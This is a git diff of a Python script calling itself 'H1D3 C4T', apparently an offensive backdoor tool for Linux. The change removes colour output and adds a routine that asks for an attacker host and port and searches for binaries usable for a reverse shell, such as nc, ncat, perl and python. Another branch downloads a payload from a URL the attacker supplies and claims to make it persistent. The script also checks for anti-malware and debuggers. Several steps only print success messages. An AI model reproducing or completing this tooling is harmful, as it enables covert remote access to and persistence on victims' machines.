@@ -6,7 +6,6 @@
 
 
 import os
-from colorama import Fore
 import sys
 from urllib.request import urlretrieve
 import psutil
@@ -36,14 +35,21 @@ def check_debugger_linux():
 
 def internal_backdoor_linux():
 
-    print(Fore.MAGENTA + "[!] BACKDOOR IS INTERNAL" + Fore.RESET)
- 
+    print("[!] BACKDOOR IS INTERNAL")
+    LHOST = input("[$] SET LHOST => ")
+    LPORT = input("[$] SET LPORT => ")
+
+    print(f"[@] YOUR LHOST {LHOST}:{LPORT} IMPLEMENTED PERSISTENCE...")
+    reverse_shell_binary = {'/usr/bin/busybox', '/usr/local/bin/busybox', '/bin/busybox', '/usr/bin/nc', '/usr/local/bin/nc', '/bin/nc', '/usr/bin/ncat', '/usr/local/bin/ncat', '/bin/ncat', '/usr/bin/perl', '/usr/local/bin/perl', '/bin/perl', '/usr/bin/python', '/usr/local/bin/python', '/bin/python', '/usr/bin/python3', '/usr/local/bin/python3', '/bin/python3', '/usr/bin/ruby', '/usr/local/bin/ruby', '/bin/ruby'}
+    for reverse in reverse_shell_binary:
+        if os.path.exists(reverse):
+            print(f"[#] FOUND BINARY TO REVERSE SHELL: {reverse}")
 
 
 def external_backdoor_linux():
 
-    print(Fore.GREEN + "[!] BACKDOOR IS EXTERNAL")
-    choice_payload_attacker = input(Fore.BLUE + "[*] Is Your Payload On The Network Or On The Local Machine? surface/local => ")
+    print("[!] BACKDOOR IS EXTERNAL")
+    choice_payload_attacker = input("[*] Is Your Payload On The Network Or On The Local Machine? surface/local => ")
     if "surface" in choice_payload_attacker:
         url_payload = input("[@] URL YOUR PAYLOAD => ")
         url_payload_dest = input("[#] PUT DESTINATION PATH FOR PAYLOAD (example /tmp/) => ")
@@ -52,27 +58,28 @@ def external_backdoor_linux():
         dst = url_payload_dest + url_payload_name
         urlretrieve(url, dst)
         if os.path.exists(dst):
-            print(Fore.MAGENTA + f"[7w7] Payload Found In -> {dst}")
-            print(Fore.GREEN + "[1337] IMPLEMENTED PERSISTENCE IN PAYLOAD")
+            print(f"[7w7] Payload Found In -> {dst}")
+            print("[1337] IMPLEMENTED PERSISTENCE IN PAYLOAD")
         else:
-            print(Fore.RED + "[!] Payload Not Found => ")
+            print("[!] Payload Not Found => ")
             sys.exit(1)
     elif "local" in choice_payload_attacker:
         path_payload = input("[#] PATH YOUR PAYLOAD => ")
         access_payload = os.path.exists(path_payload)
         if access_payload:
-            print(Fore.GREEN + "[1337] IMPLEMENTED PERSITENCE IN  PAYLOAD")
+            print("[1337] IMPLEMENTED PERSITENCE IN  PAYLOAD")
         else:
-            print(Fore.RED + f"[!] NOT FOUND PATH PAYLOAD TRY AGAIN! => {path_payload}")
+            print(f"[!] NOT FOUND PATH PAYLOAD TRY AGAIN! => {path_payload}")
     else:
-        print(Fore.RED + "[!] ?????? TRY AGAIN -> surface or local")
+        print("[!] ?????? TRY AGAIN -> surface or local")
 
 
 
 
 
 
-print(Fore.CYAN + r'''
+print(r'''
+       
            \`*-.                    
             )  _`-.                 
            .  : `. .                
@@ -87,29 +94,29 @@ print(Fore.CYAN + r'''
              ; '   : :`-:     _.`* ;
             .*' /  .*' ; .*`- +'  `*' 
             `*-*   `*-*  `*-*'
-            
+
     H1D3 C4T ||NULLBYTE||
 ''')
 
-print(Fore.GREEN + "-----------------------------------------------")
-print(Fore.GREEN + "[!] Checking Operating System...")
+print("-----------------------------------------------")
+print("[!] Checking Operating System...")
 check_system()
-print(Fore.GREEN + "[!] Checking Anti-Malware/Debuggers Running...")
+print("[!] Checking Anti-Malware/Debuggers Running...")
 check_debugger_linux()
-print(Fore.GREEN + "-----------------------------------------------")
+print("-----------------------------------------------")
 
 if "linux" in check_system():
-    print(Fore.RED + "[!] SYSTEM LINUX")
-    choice_linux = input(Fore.BLUE + "[#] YOU WANT USE EXTERNAL BACKDOOR OR INTERNAL BACKDOOR? internal/external => ")
+    print("[!] SYSTEM LINUX")
+    choice_linux = input("[#] YOU WANT USE EXTERNAL BACKDOOR OR INTERNAL BACKDOOR? internal/external => ")
     if "internal" in choice_linux:
         internal_backdoor_linux()
     elif "external" in choice_linux:
         external_backdoor_linux()
     else:
-        print(Fore.RED + "[!] Write internal or external try again! 7w7")
+        print("[!] Write internal or external try again! 7w7")
         sys.exit(1)
 elif "windows" in check_system():
-    print(Fore.BLUE + "[!] SYSTEM WINDOWS!")
+    print("[!] SYSTEM WINDOWS!")
     choice_windows = input("[#] YOU WANT USE EXTERNAL BACKDOOR OR INTERNAL BACKDOOR? internal/external => ")
 else:
     print("[!] MACHINE UNKNOW")
